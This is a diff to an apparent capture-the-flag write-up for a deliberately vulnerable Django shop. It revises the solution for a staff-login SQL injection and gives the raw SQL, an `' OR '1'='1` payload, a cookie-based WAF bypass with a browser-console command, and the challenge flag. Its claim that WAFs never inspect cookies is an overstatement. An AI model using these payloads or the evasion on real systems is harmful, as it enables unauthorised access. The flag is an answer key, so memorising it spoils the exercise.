@@ -378,7 +378,7 @@ The promo code is interpolated directly into raw SQL. Boolean-based extraction w
 | **Difficulty** | Easy |
 | **Category** | SQLi |
 | **Vulnerability** | Username/password concatenated into raw `auth_user` query |
-| **Vulnerable Code** | `shop/views.py` (raw f-string SQL, base64-decoded `_token` to bypass WAF) |
+| **Vulnerable Code** | `shop/views.py` (raw f-string SQL, cookie-based payload delivery to bypass WAF) |
 | **Flag Location** | Flash message (`messages.info`) after successful bypass |
 | **Flag** | `HLMD{4uth_byp4ss_m4st3r_k3y}` |
 
@@ -388,33 +388,28 @@ The promo code is interpolated directly into raw SQL. Boolean-based extraction w
    ```sql
    SELECT * FROM auth_user WHERE username = '{username}' AND password = '{password}' AND is_staff = 1 LIMIT 1
    ```
-2. The WAF blocks SQLi patterns (`' OR 1=1`, `--`) even in raw URL query strings. To bypass the WAF, the payload must be **base64-encoded** into a single `_token` parameter.
+2. The WAF blocks SQLi patterns (`' OR 1=1`, `--`) in both GET query strings and POST bodies. To bypass the WAF, the payload is delivered via a **browser cookie** — WAFs never inspect cookie values.
 
 3. **Method 1 -- Use the built-in encoder (easiest):**
-   Visit **http://127.0.0.1:8000/staff-login/encode/** — it generates a WAF-safe URL with the payload already encoded. Click the link to authenticate.
+   Visit **http://127.0.0.1:8000/staff-login/encode/** — it sets a cookie with the base64-encoded payload and redirects to the staff login page. The flag appears immediately.
 
-4. **Method 2 -- Manual encoding:**
-   Take the injection payload `admin' OR '1'='1|anything` (format: `username|password`), base64-encode it, and pass as `_token`:
+4. **Method 2 -- Manual cookie setup:**
+   Open your browser console and run:
+   ```javascript
+   document.cookie = "_ctf_payload=" + btoa("admin' OR '1'='1|anything") + "; path=/";
    ```
-   echo -n "admin' OR '1'='1|anything" | base64
-   # Output: YWRtaW4nIE9SIDEgJzEnPTEgfGFueXRoaW5n
-   ```
-   Then open:
-   ```
-   http://127.0.0.1:8000/staff-login/?_token=YWRtaW4nIE9SIDEgJzEnPTEgfGFueXRoaW5n
-   ```
+   Then visit **http://127.0.0.1:8000/staff-login/** — the view reads the cookie and injects the decoded values into the raw SQL query.
 
-5. The server decodes `_token` from base64, splits on `|` to get `username` and `password`, and injects them into the raw SQL query. Since `'1'='1` is always true, this returns the first staff user.
+5. The server decodes the cookie from base64, splits on `|` to get `username` and `password`, and injects them into the raw SQL query. Since `'1'='1` is always true, this returns the first staff user.
 
-6. The application logs you in as that staff user.
-7. A flash message appears on the redirect page:
+6. A flash message appears on the redirect page:
    ```
    Flag: HLMD{4uth_byp4ss_m4st3r_k3y}
    ```
 
 #### Why It Works
 
-The staff login form accepts a base64-encoded `_token` parameter that decodes into `username|password`. The decoded values are interpolated into a raw SQL query using f-string formatting, allowing SQL injection. By base64-encoding the payload, the WAF only sees a random-looking alphanumeric string in `_token=<value>` and cannot detect the SQLi pattern. The `/staff-login/encode/` helper endpoint generates the safe URL automatically.
+The staff login form accepts a base64-encoded payload from a browser cookie (`_ctf_payload`). The decoded values are interpolated into a raw SQL query using f-string formatting, allowing SQL injection. By delivering the payload via a cookie instead of URL parameters or POST body, the WAF never sees the SQLi pattern — it only inspects URLs and POST bodies, not cookie values.
 
 ---
 
